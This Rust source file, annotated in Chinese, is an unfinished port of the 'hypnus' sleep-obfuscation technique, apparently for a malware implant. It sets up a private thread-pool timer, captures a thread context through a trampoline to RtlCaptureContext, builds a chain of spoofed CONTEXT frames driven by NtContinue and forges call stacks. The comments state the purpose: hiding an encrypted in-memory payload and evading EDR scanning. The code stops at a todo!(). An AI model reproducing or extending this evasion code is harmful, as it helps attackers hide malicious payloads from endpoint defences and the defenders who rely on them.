#![allow(unused)]

//use alloc::string::String;//原项目hypnus中用于obfstr的宏展开,samoa中未使用obfstr

use puerto::winapis::NT_SUCCESS;
use spin::mutex;
// uwd库中lib.rs使用了pub use uwd::*;=uwd::uwd::AsPointer
use uwd::AsPointer;

use crate::error::HypnusError::{
    InvalidArguments, NtCreateEventFailed, NtDuplicateObjectFailed, NtWaitForSingleObjectFailed, TpAllocPoolFailed, TpAllocTimerNtSetEventFailed, TpAllocTimerRtlCaptureContextFailed, TpSetPoolStackInformationFailed,
};
use crate::types::{
    CONTEXT_FULL, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, TP_CALLBACK_ENVIRON_V3,
    TP_POOL_STACK_INFORMATION,
};
use crate::winapis::{
    NtCreateEvent, NtSetEvent2, NtWaitForSingleObject, TpAllocPool, TpAllocTimer, TpSetPoolMaxThreads, TpSetPoolMinThreads, TpSetPoolStackInformation, TpSetTimer,NtDuplicateObject,
};
use crate::{debug_log, stealth_bail};
use core::ptr::null;
use core::task::Context;
use core::{ffi::c_void, mem::zeroed, ptr::null_mut, time};

use crate::gadget::{GadgetContext};// gadgetcontext是一个trait,其内部是fn jmp(),因为jmp没有pub,只能通过引入gadgetcontext的方式引入jmp()
use crate::config::{Config, init_config,current_rsp};
use crate::error::{HypnusError, Result}; // 代替源码hyonus中anyhow的Result

use puerto::types::{CONTEXT, EVENT_ALL_ACCESS, EVENT_TYPE, LARGE_INTEGER,DUPLICATE_SAME_ACCESS};
use puerto::winapis::{NtCurrentProcess,NtCurrentThread};
/// Enumeration of supported memory obfuscation strategies
///
/// 用于指定休眠混淆的底层调度方式(线程池/APC),并用于fiber入口处路由执行框架;无论Timer还是Foliage,核心主载荷的加密方式都是写死的(ROP链中的SystemFunction040)
pub enum Obfuscation {
    /// The technique using windows thread poll(TpSetTimer)
    /// 单元变体（Unit Variant):该类型不携带数据,写出全名就是初始化
    Timer,
    /// The technique using windows thread poll(TpSetWait)
    Wait,
    /// The technique using Apc(NtQueueApcThread)
    Foliage,
}

// derive相关 详见rust grammer
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
// 代表透明内存布局(编译时,把该类型当作其内部的类型对待):强制ObfMode结构体内部布局和定义时的内部字段完全一致(物理内存中的大小(等于u32的4字节大小)/对齐(等于u32的4字节对齐)/abi(如一个函数接收这个类型的参数时,与接收一个u32没有区别.如果没有这个属性,编译器可能把这个结构体通过栈/指针来隐式传递) 与u32一致,不能有多余padding),避免rustc的优化(默认是#[repr(transparent)]).使ObfMode中u32的值和物理属性与u32完全一致.
#[repr(transparent)]
/// 元组结构体(包含一个匿名字段/成员)
/// 是Rust中的NewType模式:即用结构体包装一个已有类型以提供类型安全
/// 该结构体用于表示:混淆中是否开启额外的内存操作特权(是私有堆独立加密/主载荷的rwx权限妥协).该结构体ObfMode不改变使用的加密方式(SystemFunction040),只更改内存权限
pub struct ObfMode(pub u32);

/// 后续会手动传入timer!/wait!/Hypnus结构体.在执行时,会通过这个值决定如何操作内存加密
impl ObfMode {
    // Rust中,在impl中为结构体定义附属于该类型的常量
    // 这里的None是一个全局公开常量,其内部的值是ObfMode(0b0000);借助#[repr(transparent)],其本质是一个u32,但在Rust类型系统角度,它是一个新的ObfMode类型.
    // None不是rust关键字(是core::option::Option::None).且控制在impl ObfMode命名空间中,不会和预导入的None冲突
    pub const None: Self = ObfMode(0b0000);

    // ObfMode结构体内部只有一个u32,后面的Heap/Rwx都是ObfMode这个结构体的不同值(封装了不同的u32)
    pub const Heap: Self = ObfMode(0b0001);

    pub const Rwx: Self = ObfMode(0b0010);

    /// Checks whether the flag contains another `ObfMode`.
    ///
    /// 该函数参数传入self,但上面对ObfMode derive了copy.self从移动所有权变成了按位复制.不改变原所有权,把复制的数据给了函数
    fn contains(self, other: ObfMode) -> bool {
        (self.0 & other.0) == other.0
    }
}

/// 重载|操作符(针对ObfMode)
impl core::ops::BitOr for ObfMode {
    type Output = Self;

    fn bitor(self, rhs: Self) -> Self::Output {
        ObfMode(self.0 | rhs.0)
    }
}

/// Structure responsible for centralizing memory obfuscation techniques
///
/// 该机构体封装目标载荷的内存(base,size表示),休眠时钟(timer),底层api地址(cfg),混淆时的内存权限(ObfMode).
///
/// 项目于中所有具体执行流(timer/wait/foliage)都是在该结构体上实现的
#[derive(Clone, Copy, Debug)]
struct Hypnus {
    /// base memory pointer to be manipulated or operated on
    base: u64,

    size: u64,

    /// delay time in seconds
    time: u64,

    /// resolved winapi required for execution
    // cfg:&'static Config,
    cfg: &'static Config,

    /// Obfuscantion modes
    mode: ObfMode,
}

impl Hypnus {
    /// create a new Hypnus structure

    #[inline]
    fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
        if base == 0 || size == 0 || time == 0 {
            stealth_bail!(InvalidArguments, "invalid arguments")
        }

        Ok(Self {
            base,
            size,
            time,
            // 在宏调用时赋予了实参.这是省略写法=mode:mode, rust中,实例化一个结构体时,如果当前作用域内存在一个与结构体字段同名的变量.可以省略:value的赋值部分
            mode,
            cfg: init_config()?,
        })
    }

    /// performs memory obfuscation using a thread-pool timer sequence
    fn timer(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use:heap是ObfMode字段的值.这里代表使用堆加密的混淆方式
            let heap = self.mode.contains(ObfMode::Heap);

            // 内存权限:载荷解密后使用rx还是rwx
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // 后续用到的三个event的载体
            let mut events = [null_mut(); 3];

            // 曾将&mut events写成event.区别:由于数组evevts是*mut c_void(实现了Copy trait),通过copy将events的每个元素传入循环体(即events元素的类型从&mut *mut c_void 退化为*mut c_void)在循环内部创建的事件句柄不会写入原events数组.循环结束原events数组中元素仍为null_mut()
            for event in &mut events {
                // ffi的extern "system"方式调用win native api
                let status = NtCreateEvent(
                    // 输出:成功的事件对象handle
                    event,
                    EVENT_ALL_ACCESS,
                    null_mut(), // 传空代表该事件是anonymous的.EDR对有名事件在扫描全局对象目录时很容易发现.anonymous对象只存于当前进程句柄表,隐匿性最高
                    EVENT_TYPE::NotificationEvent, //设置为有信号的通知型事件:会一直保持有信号状态,直到被重置(在hypnus的异步链中,一个事件可能被多个context同时等待,通知型事件能确保所有监听者都能收到信号)
                    0, // 初始为无信号状态,意味着所有等待该事件的线程都会立即挂起,直到后续有指令发其他信号);
                );

                if !NT_SUCCESS(status) {
                    stealth_bail!(NtCreateEventFailed, "NtCreateEvent Failed"); // 宏后面到底需要加 ; 吗
                }
            }

            // 开始配置并初始化一个 threadpool
            // Allocate dedicated threadpool with one worker

            // 用来表示指向TP_POOL的句柄:代表整个线程池的根,后续所有线程数量/大小都同各国这个poll指针进行挂载
            let mut pool: *mut c_void = null_mut();

            // 用TpAllocPool在用户态堆区分配并初始化一个TP_POOL结构体,并在内核中创建一个Worker Factory对象.但此时并没有产生真正的线程
            let mut status = TpAllocPool(
                &mut pool, // 对应的参数类型是指针的指针,所以尽管pool本身是copy的,这里也需要用&
                null_mut(),
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(TpAllocPoolFailed, "TpAllocPool Failed")
            }

            // Configure threadpool stack size
            // 0x80000=512kb,这个4kb是怎么计算得到的,见注释1
            let mut stack = TP_POOL_STACK_INFORMATION {
                StackCommit: 0x80000,
                StackReserve: 0x80000,
            };

            // 创建线程池
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    TpSetPoolStackInformationFailed,
                    "TpSetPoolStackInformation Failed"
                )
            }

            // 设置该线程池中线程串行执行,消除竞争
            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            /// prepare callback environment,将后续所有异步任务强行绑定到自定义的私有单线程池上.详见hypnus.md
            let mut env = TP_CALLBACK_ENVIRON_V3 {
                Pool: pool,
                ..Default::default()
            };
            // 线程池配置完成

            // capture the current thread context

            let mut timer_ctx: *mut c_void = null_mut();

            /// 代表当前所有寄存器状态快照:除了rcx置为RtlCaptureContext的地址
            /// 在主线程开辟1.2kb空间(sizeof(CONTEXT)).后续将代表寄存器状态快照(CONTEXT),[rcx](rcx是寄存器地址)置为RtlCaptureContext的地址.
            /// 后续trampoline执行jmp [rcx]时,cpu就跳入ntdll!RtlCaptureContext开始执行
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // 分配第一个定时器对象timer_ctx:与win api RtlCaptureCpntext绑定,由于这个api是微软编译好的系统只读api,且存在rdx 和 rcx的寄存器错位,所以需要trampoline调整(注意和第二个定时器的区别)
            // 本项目作用:见下一个函数TpSetTimer
            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            status = TpAllocTimer(
                // 输出:代表该函数成功执行后,内核新创建的定时器对象TP_TIMER的虚拟内存地址指针(用户态程序拿到的永远是VA)
                &mut timer_ctx,
                // 回调(定时器触发后执行的回调函数入口地址):指向trampoline:Config中的trampoline(mov rcx,rdx .. jmp [rcx]).而P1Home(对应执行时寄存器解引用的[rcx])已经在ctx_init中设为RtlCaptureContext的地址.为何要使用trampoline 见hypnus.md
                self.cfg.trampoline as *mut c_void,
                // 回调函数执行时的寄存器状态(CONTEXT). 语法方面详见注释2
                &raw mut *&mut ctx_init as *mut _ as *mut c_void,
                // 回调函数执行时,使用的线程池环境
                &mut env,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    TpAllocTimerRtlCaptureContextFailed,
                    "TpAllocTimer [RtlCaptureContext] Failed"
                )
            }

            // LARGE_INTEGER win特有的64位的union:用于表示超大整数.是win处理系统时间/性能/计数的唯一标准
            // core::mem::zeroed,将该64位内存全部刷为0(但不包括结构体中个字段中间的padding),防止被之前脏数据干扰.
            let mut delay = zeroed::<LARGE_INTEGER>();

            // win内核的时间精度是100纳秒(1ms毫秒=1000us微秒;1us=10*100纳秒).1ms=10000个100纳秒单位.即100i64 * 10_000表示100ms
            // win下,正数代表绝对时间,从1601年1月1日起算的总刻度;负数代表相对时间,从现在起算.
            // 这里代表100ms后执行
            delay.QuadPart = -(100i64 * 10_000);

            // 激活第一个定时器对象timer_ctx,将TpAllocTimer分配的这个定时器对象激活,开始倒计时
            // 本项目作用:主线程100ms后触发定时器,主线程调用NtWaitForSingleObject挂起自身.定时器触发后,内核唤醒私有线程池中唯一的worker执行trampoline,在trampoline中引导cpu执行ntdll!RtlCaptureContext将该worker此刻寄存器状态写入ctx_init.后续以此为基础设置10个ctx
            TpSetTimer(
                // 输出参数,由tpalloctimer产生,在调用TpSetTimer前,已经被TpAllocTimer填入
                timer_ctx, // 唤醒时刻
                &mut delay, // 周期msperiod,0代表是one-shot单次触发任务;
                0,
                // msWindowLength - 时间窗口:允许系统延迟执行的宽限期.0代表只要倒计时一归零，必须立刻发送唤醒信号(实际执行中受硬件时钟终端频率限制(一般15.6ms),除非使用timeBeginPeriod修改系统时钟频率)
                0,
            );
            // 第一个定时器timer_ctx配置完成

            // 设置第二个定时器:第一个定时器执行RtlCaptureContext捕获快照后,直接返回,主线程继续休眠.第二个定时器设为200ms,去点亮events[0]
            let mut timer_event = null_mut();

            // 第二个定时器绑定的是事件events[0]:用于通知主线程快照已经抓完,可以继续向下执行.
            //
            status = TpAllocTimer(
                // 输出:第二个定时器handle
                &mut timer_event,
                // win api:将事件对象从无信号转为有信号 详见注释3
                NtSetEvent2 as *mut c_void,
                //  函数开头创建的第一个事件handle
                // 1. events[0]->TpAllocTimer(事件与定时器绑定);2. 定时器触发-> events[0] 被塞进 CPU 的 RDX 寄存器(根据回调函数的约定,这里的第三个参数作为回调函数的第二个参数);3. NtSetEvent2 被调用 -> 它用 RDX中的handle,去内核发起系统调用
                events[0],
                &mut env,
            );
if !NT_SUCCESS(status) {
    stealth_bail!(TpAllocTimerNtSetEventFailed,"TpAllocTimer [NtSetEvent] Failed")
}

// 将主线程(当前线程)陷入休眠(将events[0]绑定到NtWaitForSingleObject),直到指定的events[0]信号出现,才继续执行主线程
// Wait for context capture to complete
status=NtWaitForSingleObject(
    // 等待的事件对象句柄
    events[0], 
    // 是否可被其他中断唤醒
    0,
    // 等待时长(这里代表事件信号出现就立即执行)
    null_mut());
if !NT_SUCCESS(status) {
    stealth_bail!(NtWaitForSingleObjectFailed,"NtWaitForSingleObject Failed")
}

// 主线程陷入休眠,开始构建十个ctx
// Build multi-step spoofed CONTEXT chain
            // 每个ctx_init都是cpu的瞬时寄存器数据,用于加载到NtContinue,通过Ntcontinue构建config,然后修改config执行指定的函数.
            // 根据上面获取的快照ctx_init,伪造10份.CONTEXT derive copy,这里在内存(栈)执行了10此memcpy.即创建了10个一样的执行环境,每个都有该线程池的线程的原始寄存器状态
let mut ctxs = [ctx_init;10];
// 将10个ctx的rax置为NtContinue的地址,然后将栈向低地址扩张8个字节,用来在rsp指向的空间中保存伪造的返回地址(ROP链中下一跳的地址).防止原栈顶数据被覆盖
// 因为ASLR的存在,ntcontinue的va是动态随机的.因此不能在编译阶段将其地址硬编码在静态的机器码中.所以要动态解析其地址并存入ctx.rax中,之后通过trampoline(cfg.callback)读取并跳转
  for ctx in &mut ctxs {
                // NtContinue接收一个context,强迫cpu变成context描述的状态
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

 // Duplicate thread handle for context manipulation
 // NtCurrentThread() （伪句柄  -2)代表当前工作线程.t_thread通过NtDuplicateObject获取主线程的绝对真实句柄.锁定这个绝对句柄一定也只能指向主线程
            let mut h_thread = null_mut();

// NtDuplicateObject,内核提供的handle克隆api.在内核句柄表(handle table)中,创建新索引条目,该条目指向一个存在的内核对象.可以跨进程克隆句柄,可以在同一进程中将受限/临时的句柄转为永久/有完全访问权限的实体句柄
            // 其核心功能是将源进程表中的一个对象句柄索引，在目标进程（或同进程）的句柄表中创建一个新的有效条目，并根据权限掩码（ACCESS_MASK）赋予其相应的访问能力
            // 在该项目中，此函数的作用是将当前线程的“伪句柄（Pseudo-handle）”转换为具备完整访问权限的“真实内核对象句柄”，以解决多线程异步环境下的定位冲突.这里将伪句柄(-2)传给ctx.rcx传给,
            status = NtDuplicateObject(
                // 源进程
                NtCurrentProcess(),
                // 源对象
                NtCurrentThread(),
                // 目标进程
                NtCurrentProcess(),
                // 目标对象
                &mut h_thread,
                // 期望权限
                0,
                // 句柄属性
                0,
                // 复刻源的所有权利
                DUPLICATE_SAME_ACCESS,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(NtDuplicateObjectFailed,"NtDuplicateObject Failed")
            }

            // 调用config.rs中的spoof_context(),构建伪造的回溯链
// Base CONTEXT for spoofing
            ctx_init.Rsp = current_rsp();
            // spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链.这里ctx_init提供当前栈的所有寄存器状态
            // EDR回溯的起点是rsp指向的栈槽位,即使rip里是payload地址,也不影响伪造栈.即,这里从payload之后开始一直伪装到回溯的根部
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // 开始构造10个ctx
            // The chain will wait until `event` is signaled
            ctxs[0].jmp(self.cfg,self.cfg.nt_wait_for_single.into());









            todo!()
        }
    }
}

// 注释1
// win默认在线程启动只提交4kb.当线程的局部变量需要更多栈空间时,必须顺序访问下一个页面,触发PAGE_GUARD保护页异常,os内核捕获后会自动提交新页面.但是只有最后一个committed的页是Guard Page(其属性是PAGE_GUARD | PAGE_READWRITE),该页处于committed 和 reserved之间.
// 在向属性PAGE_GUARD的页写入数据时,才会触发Page Fault缺页异常,进而陷入内核(缺页异常处理程序)由内核去除该页的PAGE_GUARD属性,将其变为普通committed的可读写页,将下一个相邻的页属性变为PAGE_GUARD.结果是:栈安全的向下扩展一页,程序无感知的继续运行.
// 但在spoof.rs的spoof函数, ctx.Rsp = (ctx.Rsp - 0x1000 * 10) - (伪造栈帧大小);减去了40+kb的空间.以保守的40kb计算,这里rsp直接指向了非常远的位置,自然跳过了属性为PAGE_GUARD的页.那么当cpu尝试向该页写入数据,cpu硬件触发Page Fault(缺页异常),进而陷入内核,但是对应的内存虚拟地址没有PAGE_GUARD属性.内核判定这不是合法的栈增长请求,而是一个非法的野指针尝试写入未分配的内存.内核进而向该线程派发 STATUS_ACCESS_VIOLATION （ 0xC0000005,即段错误/内存越界访问）异常.而代码又没有捕获该异常,进程瞬间崩溃.
// 扩展:正常程序如果声明一个巨大的局部变量(如 char buffer[102400]; 即100k的栈缓冲区),那么也会出现撞向未提交页面和绕过保护页的情况.但正常程序没有崩溃,在于编译器(如MSVC GCC Clang Rustc)后台使用一种栈探测Stack Probing的机制,即 _ _chkstk 栈探测函数
// 编译器发现某个函数内部申请的栈空间超过一个页面4kb的大小时.编译器不会直接生成sub rsp,102400这样的指令,而是在函数入口强行插入对系统底层函数_ _chkstk的调用的指令.
// 该函数由微软运行时库提供,它在内部执行一个循环,以4kb为步长,借用临时寄存器(win64下是rcx)复制当前rsp,然后逐步sub rcx,4096,再用test [rcx],eax去触碰该页面,强制触发PAGE_GUARD异常,让内核提交内存.这样确保每一个PAGE_GUARD保护页都按顺序被触发,最后一次性执行sub rsp,rax,把rsp挪到最终位置.这样,内核一页一页的提交内存,直到申请的栈大小全部被提交后. __chkstk  才会正式将  RSP  指针修改为最终的目标地址，并返回

// 注释2
//  &mut ctx_init: 栈上获取本地变量ctx_init的唯一可变引用,其类型是&mut CONTEXT
// as *mut _:跨越安全边界并自动推导类型,将安全的可变引用&mut 强制转为*mut(裸指针).这里的 _ 是类型占位符,作用是让Rustc根据上下文自动推导目标类型,可以提高代码的移植性避免冗长的类型声明.因为,CONTEXT可能来自不同的第三方库(puerto/dinvk)

// 注释3
// 如何从外部链接到本项目的:在winapis.rs中有对NtSetEvent2的定义(作为一个封装的中转函数)
// 其内部调用NtSetEvent win api需要2个参数,
// 但是根据TpAllocTimer的约定,其代表回调函数的参数要符合PTP_TIMER_CALLBACK(等待定时器回调函数原型),该原型接收3个参数.
// 但是后续的wait模式(使用TpAllocWait注册,其回调的参数要符合PTP_WAIT_CALLBACK(等待事件回调函数原型),接收4个参数).为了方便后续复用,将ntsetevent2直接设计为4个参数
// 在混淆逻辑运行时,调用NtSetEvent2的是win线程池的工作线程(worker thread).当线程池触发定时器跳到NtSetEvent2时,工作线程内部会执行给寄存器赋值操作
// 第一个定时器使用trampolie 第二个定时器使用wrapper函数:核心原因是 RtlCaptureContext本身就是捕获当前寄存器状态的,如果使用wrapper RtlCaptureContext的方式,明显会由于proluge 和 尾声 破坏当前寄存器状态.
// 而tampoline(mov rcx,rdx xor rdx,rdx jmpQWORD PTR [rcx])其物理上直接jmp到RtlCaptureContext. 
// 它没有proluge:没有修改栈的指令,栈状态干净;使用jmp而不是call 无条件跳转不向栈压入返回地址.
// 在cpu看来 和线程池内核调度器直接调用一样,从而抓到完美的,没有代码痕迹的工作线程快照.
// 而 NtSetEvent 这个win api 根本不关心调用者的栈和寄存器状态,它无所谓被包装函数修改